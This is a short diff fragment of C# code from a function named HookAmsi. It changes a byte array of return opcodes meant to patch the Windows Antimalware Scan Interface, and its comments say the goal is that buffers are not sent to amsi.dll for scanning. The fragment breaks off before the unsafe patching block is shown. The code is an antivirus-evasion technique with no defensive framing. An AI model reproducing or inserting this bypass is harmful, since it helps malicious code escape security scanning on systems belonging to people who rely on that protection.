@@ -1,7 +1,8 @@
 static void HookAmsi()
 {
-  // return AMSI_RESULT_CLEAN
-  byte[] retOne = new byte[] { 0xC2, 0x01, 0x00 };
+  // everything is alright, nothing to see here
+	// we don't send the buffer to amsi.dll
+  byte[] retOne = new byte[] { 0xC2, 0x00, 0x00 };
 
   unsafe 
   {
